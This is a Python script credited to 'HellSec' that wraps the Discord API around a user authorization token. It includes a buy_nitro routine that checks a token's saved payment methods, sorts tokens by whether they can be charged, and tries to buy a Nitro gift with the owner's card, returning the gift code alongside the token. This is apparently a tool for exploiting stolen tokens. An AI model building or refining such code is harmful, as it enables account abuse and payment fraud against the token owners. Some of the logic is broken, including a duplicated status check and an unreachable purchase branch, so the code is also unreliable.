'''
Created By HellSec
Date: OCT 31, 2021
'''

import requests, time

class Discord:
    def __init__(self, token):
        self.token = token
        self.headers = {'authorization': token}

    def check_status(self, response):
        '''
        Status response for Discord
        Given a response code for an error output
        Ex: 
            ERROR 403
            The Authorization token you passed did not have permission to the resource.
        '''
        if response.status_code == 403: return('The Authorization token you passed did not have permission to the resource.')
        if response.status_code == 400: return('The request was improperly formatted, or the server couldn\'t understand it.')
        if response.status_code == 429: return('You are being rate limited.')
        if response.status_code == 403: return('The Authorization header was missing or invalid.')
        if response.status_code == 200: return response

    def send_message(self, message=None, channel=None, mention=None, delete_after=0):
        '''
        Send message function
        Requires message content and channel ID
        delete_after is when to delete rounded to seconds 
        '''
        r = requests.post(
            url = f'https://discord.com/api/v9/channels/{channel}/messages',
            data = {'content': str(message)},
            headers = self.headers
        )
        if delete_after != 0 and r.status_code == 200:
            message, channel = r.json()['id'], r.json()['channel_id']
            time.sleep(int(delete_after))
            self.delete_message(message, channel)

        return self.check_status(r)

    def delete_message(self, message=None, channel=None):
        '''
        Delete a message based off message ID
        '''
        r = requests.delete(
            url = f'https://discord.com/api/v9/channels/{channel}/messages/{message}',
            headers = self.headers
        )
        return self.check_status(r)

    def get_user(self, user=None, connections=False, servers=False) -> dict:
        '''
        Get user details and respond with a dict object
        '''
        r = requests.get(
            url = f'https://discord.com/api/v9/users/{user}/profile?with_mutual_guilds={servers}',
            headers = self.headers
        )
        return self.check_status(r)
    
    def buy_nitro(self):
        r = requests.get(
            url = 'https://discordapp.com/api/v6/users/@me/billing/payment-sources', 
            headers = self.headers
        )

        if r.status_code == 200 and "[]" in r.text:
            return(f'No Payment Method, {self.token}')

        elif "You need to verify your account in order to perform this action." in r.text:
            return(f'Unverified Token, {self.token}')

        elif r.status_code == 200:

            payment_source_id = r.json()[0]['id']

            if '"invalid": true' in r.text:
                return(f'Invalid Payment, {self.token}')

            elif 'This purchase request is invalid.' in r.text:
                return(f'Invalid Payment, {self.token}')

            elif '"invalid": true' in r.text:
                r = requests.post(
                    url = f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', 
                    headers = self.headers, 
                    json = {'expected_amount': '999','gift': True, 'payment_source_id': payment_source_id}
                )
                return(f'discord.gift/{r.json()["gift_code"]}, {self.token}')

            else:
                return(f'Invalid Payment, {self.token}')

        elif r.status_code == 401:
            return(f'Invalid Token, {self.token}')
